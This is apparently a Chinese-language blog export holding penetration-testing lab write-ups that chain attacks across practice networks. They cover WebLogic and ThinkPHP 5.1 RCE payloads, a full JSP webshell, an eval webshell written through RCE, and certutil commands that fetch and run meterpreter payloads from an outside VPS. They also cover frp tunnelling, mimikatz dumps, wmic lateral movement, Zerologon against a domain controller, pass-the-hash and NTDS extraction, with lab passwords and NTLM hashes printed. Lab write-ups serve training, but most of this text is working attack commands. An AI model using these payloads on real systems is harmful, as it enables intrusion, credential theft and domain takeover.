prompt_"># </span><span class="language-bash">三层</span></span><br><span class="line">域内：PC-Win2012</span><br><span class="line">10.10.10.69</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">10.10.10.249</span></span><br><span class="line">域控：DC-Win2012</span><br><span class="line">10.10.10.6</span><br></pre></td></tr></table></figure><h1 id="Target1-Joomla-RCE"><a href="#Target1-Joomla-RCE" class="headerlink" title="Target1 - Joomla-RCE"></a>Target1 - Joomla-RCE</h1><blockquote><p>指纹识别后，该怎么利用呢？去查找对应版本的历史漏洞</p><blockquote><p><a href="https://www.freebuf.com/sectool/181440.html">JoomScan：一款开源的OWASP Joomla漏洞扫描器</a></p></blockquote></blockquote><h2 id="漏洞利用Getshell"><a href="#漏洞利用Getshell" class="headerlink" title="漏洞利用Getshell"></a>漏洞利用Getshell</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202317804.png" alt="image-20220920231730418" style="zoom: 33%;" /><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.141/configuration.php</span><br><span class="line">http://218.76.8.99:2880/configuration.php</span><br><span class="line"></span><br><span class="line">fmxasmkmvpdyzpntoghnnblyzkimpempkoyuxifwfufsjngruq</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202317501.png" alt="image-20220920231754271" style="zoom:33%;" /><h2 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h2><ol><li>ping</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">chcp 65001&gt;nul</span><br><span class="line">echo 正在扫描。。。。。。</span><br><span class="line">for /L %%P in (1,1,254) do @ping -w 10 -n 1 192.168.1.%%P | findstr TTL= &gt;&gt;ip.txt</span><br><span class="line">echo 扫描结束，按任意键结束窗口！</span><br><span class="line"><span class="meta prompt_">pause&gt;</span><span class="language-bash">nul</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reply from 192.168.1.1: bytes=32 time=1ms TTL=64</span><br><span class="line">Reply from 192.168.1.28: bytes=32 time=2ms TTL=128</span><br><span class="line">Reply from 192.168.1.141: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.1.181: bytes=32 time=1ms TTL=64</span><br></pre></td></tr></table></figure><ol start="2"><li>arp -a</li><li>msf的arp_scanner模块</li><li>nmap</li></ol><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=5555 -f exe -o re_5555.exe</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202336418.png" alt="image-20220920233624212" style="zoom: 33%;" /><h2 id="建立socks代理"><a href="#建立socks代理" class="headerlink" title="建立socks代理"></a>建立socks代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_1.ini</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6001</span><br></pre></td></tr></table></figure><h1 id="Target2-Weblogic-RCE"><a href="#Target2-Weblogic-RCE" class="headerlink" title="Target2 - Weblogic-RCE"></a>Target2 - Weblogic-RCE</h1><blockquote><p>192.168.1.28</p></blockquote><h2 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202338805.png" alt="image-20220920233853605" style="zoom:33%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开放端口：21，80，135，445，3389，7001</span><br><span class="line">7001：weblogic</span><br><span class="line">WebLogic Server 版本: 12.1.3.0.0</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202339437.png" alt="image-20220920233909264" style="zoom:50%;" /><h2 id="WeblogicScan"><a href="#WeblogicScan" class="headerlink" title="WeblogicScan"></a>WeblogicScan</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210112954.png" alt="image-20220921011253725" style="zoom: 33%;" /><blockquote><p><a href="http://192.168.1.28:7001/_async/AsyncResponseService">http://192.168.1.28:7001/_async/AsyncResponseService</a></p></blockquote><ul><li>CVE-2019-2725</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211706358.png" alt="image-20220921170619138" style="zoom:50%;" /><blockquote><p><a href="http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p></blockquote><p>发现网段： 10.10.10.105</p><h2 id="MSF正向shell"><a href="#MSF正向shell" class="headerlink" title="MSF正向shell"></a>MSF正向shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=8899 -f exe -o bind_8899.exe</span><br></pre></td></tr></table></figure><p>通过获得的外网webshell上传木马exe文件到web服务器根目录。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载木马文件到weblogic服务器：</span></span><br><span class="line">http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=certutil.exe -urlcache -split -f http://192.168.1.141/bind_8899.exe c:\44.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行下载的木马文件：</span></span><br><span class="line">http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=cmd /c start c:\44.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">MSF通过代理正向连接建立会话</span></span><br><span class="line">setg proxies socks5:47.101.214.85:6001</span><br></pre></td></tr></table></figure><p>得到权限为administrator管理员用户权限，尝试 getsystem 成功提权到system权限</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211709604.png" alt="image-20220921170903425" style="zoom:50%;" /><p>加载mimikatz，尝试获取机器明文密码及hash：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211709932.png" alt="image-20220921170947710" style="zoom:50%;" /><p>得到如下明文密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win7-1\administrator passwd8@mingy</span><br></pre></td></tr></table></figure><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>上传jsp马，蚁剑通过代理连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.28:7001/bea_wls_internal</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain</span><br><span class="line">meterpreter &gt; upload jsp4ant.jsp servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war</span><br><span class="line">[*] uploading  : jsp4ant.jsp --&gt;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br><span class="line">[*] uploaded   : jsp4ant.jsp --&gt;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\jsp4ant.jsp</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://192.168.1.28:7001/bea_wls_internal/jsp4ant.jsp">http://192.168.1.28:7001/bea_wls_internal/jsp4ant.jsp</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211712281.png" alt="image-20220921171217099" style="zoom:50%;" /><ul><li>jsp4ant.jsp</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) </span><br><span class="line">clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;ant&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="二层socks代理"><a href="#二层socks代理" class="headerlink" title="二层socks代理"></a>二层socks代理</h2><p>上传frp，建立socks通道：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211715163.png" alt="image-20220921171514003" style="zoom:50%;" /><ul><li>vps</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>target1</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_11.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6001</span><br><span class="line">[socks5_2]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6002</span><br><span class="line">remote_port = 6003</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>target2</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_2.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.141</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6002</span><br></pre></td></tr></table></figure><h1 id="Target3-WIN2012"><a href="#Target3-WIN2012" class="headerlink" title="Target3 - WIN2012"></a>Target3 - WIN2012</h1><blockquote><p>10.10.10.249</p></blockquote><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">net view /domain</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain    //域内主机名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain  //域控主机名</span><br></pre></td></tr></table></figure><h2 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211717080.png" alt="image-20220921171734935" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbtscan.exe -m 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211717570.png" alt="image-20220921171748437" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.10.6      MINGY\WIN2012              fa:16:3e:07:cc:69 SHARING DC</span><br><span class="line">10.10.10.105    MINGY\WIN7-1               fa:16:3e:b4:b8:f7 SHARING</span><br><span class="line">10.10.10.249    MINGY\PC-WIN2012           fa:16:3e:a2:d5:4c SHARING</span><br></pre></td></tr></table></figure><h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><ul><li>wmic横向移动</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic /node:<span class="number">10.10</span>.<span class="number">10.249</span> /user:administrator /password:passwd8@mingy <span class="keyword">process</span> call create <span class="string">&quot;cmd /c certutil.exe -urlcache -split -f http://10.10.10.105:7001/bea_wls_internal/bind_8899.exe c:/windows/temp/test.exe &amp; start c:/windows/temp/test.exe&quot;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211719779.png" alt="image-20220921171908555" style="zoom:50%;" /><ul><li>正向shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setg proxies socks5:47.101.214.85:6003</span><br><span class="line">set lport 8899</span><br><span class="line">set rhost 10.10.10.249</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211719595.png" alt="image-20220921171935387" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211719848.png" alt="image-20220921171950652" style="zoom:33%;" /><p>无法获取到明文密码：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211720893.png" alt="image-20220921172011692" style="zoom:33%;" /><p>可以获取到密码hash：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211720949.png" alt="image-20220921172028789" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; creds_msv</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving msv credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line">Username       Domain      NTLM                         SHA1</span><br><span class="line">--------       ------      ----                       ----</span><br><span class="line">Administrator  PC-WIN2012  718233f1bd1be011dc0be7df2b151cef  2124386b53cb80e896c7f6e6ed2dbf7bc9a1e4b9</span><br><span class="line">PC-WIN2012$    MINGY       0a6ce51064b73f3a3c7889c135fcd627  9399380fc9ca18c661c443b4db699141e6776679</span><br><span class="line">zhangsan       MINGY       161cff084477fe596a5db81874498a24  d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br></pre></td></tr></table></figure><h2 id="Netlogon域权限提升"><a href="#Netlogon域权限提升" class="headerlink" title="Netlogon域权限提升"></a>Netlogon域权限提升</h2><blockquote><p>也有一些新的域提权漏洞。可以注意。要记得将域控hash还原，不然会崩</p></blockquote><ol><li>检查是否存在漏洞</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 zerologon_tester.py WIN2012 10.10.10.6</span><br></pre></td></tr></table></figure><ol start="2"><li>置空域账号密码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 CVE-2020-1472.py WIN2012 WIN2012$ 10.10.10.6</span><br></pre></td></tr></table></figure><ol start="3"><li>获取域控用户hash</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 secretsdump.py &#x27;mingy.com/WIN2012$@10.10.10.6&#x27; -no-pass</span><br></pre></td></tr></table></figure><ol start="4"><li>wmiexec进行hash横向连接</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:69943c5e63b4d2c104dbbcc15138b72b WIN2012$/Administrator@10.10.10.6</span><br></pre></td></tr></table></figure><ol start="5"><li>获取主机ntlm hash</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure><ol start="6"><li>解密</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL</span><br></pre></td></tr></table></figure><ol start="7"><li>还原域控hash</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 reinstalloriginalpw.py WIN2012 10.10.10.6 57dc9431075b22b267b4df27b3be1162</span><br></pre></td></tr></table></figure><h1 id="Target4-DC"><a href="#Target4-DC" class="headerlink" title="Target4 - DC"></a>Target4 - DC</h1><blockquote><p>10.10.10.6</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mingy\zhangsan</span><br><span class="line">161cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure><h2 id="PTH拿下域控"><a href="#PTH拿下域控" class="headerlink" title="PTH拿下域控"></a>PTH拿下域控</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211726954.png" alt="image-20220921172610679" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211726726.png" alt="image-20220921172623464" style="zoom:50%;" /><h2 id="vssadmin获取域内hash"><a href="#vssadmin获取域内hash" class="headerlink" title="vssadmin获取域内hash"></a>vssadmin获取域内hash</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211726701.png" alt="image-20220921172638442" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211727674.png" alt="image-20220921172700421" style="zoom:50%;" /><h2 id="解密域内密码hash"><a href="#解密域内密码hash" class="headerlink" title="解密域内密码hash"></a>解密域内密码hash</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.py -system system_mingy.hive -ntds ntd3_mingy.dit LOCAL</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211728071.png" alt="image-20220921172722684" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场一</title>
      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">218.76.8.99:2780 --&gt; 10.30.1.181:80</span><br><span class="line">218.76.8.99:2722 --&gt; 10.30.1.105:22</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 公网</span></span><br><span class="line">Attack-Kali：</span><br><span class="line">218.76.8.99 2722[ssh] root/123456</span><br><span class="line"></span><br><span class="line">WEB1<span class="emphasis">_Thinkphp5_</span>Win7</span><br><span class="line">218.76.8.99:2780 --&gt; 10.30.1.181:80</span><br><span class="line">pts 172.26.2.182</span><br><span class="line">pts1 172.26.3.63</span><br><span class="line">administrator/hacking@hetian</span><br><span class="line"></span><br><span class="line"><span class="section"># 内网</span></span><br><span class="line">WEB1<span class="emphasis">_HongCMS_</span>Win7</span><br><span class="line">pts 172.26.2.174</span><br><span class="line">pts1 172.26.3.18</span><br><span class="line">administrator/hacking@hetian</span><br><span class="line"></span><br><span class="line">WEB2-Weblogic<span class="emphasis">_RCE</span></span><br><span class="line"><span class="emphasis">pts1 172.26.3.62</span></span><br><span class="line"><span class="emphasis">pts2 172.26.4.66</span></span><br><span class="line"><span class="emphasis">root/hacking@hetian</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">WEB2_</span>Strtus2<span class="emphasis">_Centos</span></span><br><span class="line"><span class="emphasis">172.26.3.75</span></span><br><span class="line"><span class="emphasis">administrator/hacking@hetian</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">WEB3_</span>Thinkcmf<span class="emphasis">_Win7</span></span><br><span class="line"><span class="emphasis">172.26.4.22</span></span><br><span class="line"><span class="emphasis">administrator/hacking@hetian</span></span><br></pre></td></tr></table></figure><h1 id="寻找突破点-WEB1-Thinkphp5"><a href="#寻找突破点-WEB1-Thinkphp5" class="headerlink" title="寻找突破点 - WEB1_Thinkphp5"></a>寻找突破点 - WEB1_Thinkphp5</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol><li>Acunetix扫描目标 <a href="http://218.76.8.99:2780/">http://218.76.8.99:2780/</a></li><li>Wappalyzer</li><li>目录扫描</li></ol><blockquote><ul><li>dirsearch</li><li>dirb kali中很好用的一个工具</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http:��218.76.8.99:2780/ -e *</span><br></pre></td></tr></table></figure><ul><li>御剑目录扫描</li></ul></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><a href="http://218.76.8.99:2780/public/index.php">http://218.76.8.99:2780/public/index.php</a></p></blockquote><ol><li>thinkphp5.1-rce写Webshell</li></ol><ul><li>命令执行</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=whoami</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=/index/\think\request/cache&amp;key=whoami|system</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><ul><li>写webshell</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=m.php&amp;vars[1][]=%3C?php%20@eval($_POST[c]);?%3E</span><br></pre></td></tr></table></figure><ul><li>certutil下载webshell</li></ul><blockquote><p>利用命令执行在目标主机上利用certutil命令下载webshell</p><p>Windows命令行如何下载文件，参考之前的blog：</p><blockquote><p><a href="https://11pmsleep.github.io/2022-09-17-%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">windows 命令行下载文件</a></p></blockquote></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=cmd /c certutil.exe -urlcache -split -f http://139.155.49.43:8000/bx3.php C:/phpStudy/PHPTutorial/WWW/public/bx3.php</span><br></pre></td></tr></table></figure><h2 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h2><ol><li>msfvenom生成后门，并上传至靶机，msf开启监听</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># msfvenom</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=5555 -f exe &gt; re5555.exe</span><br><span class="line"><span class="comment"># metasploit</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 39.108.68.207</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 10001</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to <span class="built_in">bind</span> to 39.108.68.207:10001:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:10001</span><br><span class="line">[*] Sending stage (200262 bytes) to 218.76.8.99</span><br><span class="line">[*] Meterpreter session 1 opened (172.18.66.74:10001 --&gt;218.76.8.99:19931) at 2020-11-28 18:49:40 +0800</span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line">start re5555.exe</span><br></pre></td></tr></table></figure><ol start="2"><li>thinkphp5.1-rce 写 msf 木马，然后执行上线 msf</li></ol><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=cmd /c certutil.exe -urlcache -split -f http://139.155.49.43:8000/re5555.exe C:/windows/re5555.exe</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#attack</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=c:\windows\re5555.exe</span><br></pre></td></tr></table></figure><h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>cobaltstrike生产后门，并上传至靶机，执行payload上线beacon。操作类似</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公网或kali ==&gt; thinkphp[2网段] ==&gt; HongCMS[2,3网段] ==&gt; struts2[3网段] ==&gt; weblogic[3,4网段] ==&gt; thinkcmf[4网段]</span><br></pre></td></tr></table></figure><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># getuid</span></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="comment"># 网卡信息</span></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IPv4 Address : 172.26.2.182</span><br><span class="line">meterpreter &gt; run get_local_subnets（run post/multi/manage/autoroute）</span><br><span class="line">Local subnet: 172.26.2.0/255.255.255.0</span><br><span class="line"><span class="comment"># 配置路由</span></span><br><span class="line">meterpreter &gt; run autoroute -s 172.26.2.0/24 </span><br><span class="line"><span class="comment"># 扫描存活主机</span></span><br><span class="line"><span class="comment">## ping简单方法但比较慢</span></span><br><span class="line"><span class="keyword">for</span> /L %P <span class="keyword">in</span> (1,1,254) <span class="keyword">do</span> @ping -w 10 -n 1 172.26.2.%P | findstr TTL= &gt;&gt; ip.txt</span><br><span class="line"><span class="comment">## ladon</span></span><br><span class="line">Ladon64.exe 172.26.2.0/24 OnlinePC</span><br><span class="line">Arch: amd64 OS: windows</span><br><span class="line">Targe: 172.26.2.0/24</span><br><span class="line">Load PingScan</span><br><span class="line">PING: 172.26.2.182</span><br><span class="line">PING: 172.26.2.174</span><br><span class="line">PING: 172.26.2.2</span><br><span class="line">PING: 172.26.2.1</span><br><span class="line">PING: 172.26.2.35</span><br><span class="line"><span class="comment">## fscan</span></span><br><span class="line">fscan.exe -h 172.26.2.0/24</span><br><span class="line"><span class="comment">## arp cache</span></span><br><span class="line">meterpreter &gt; arp -a</span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    127.255.255.255  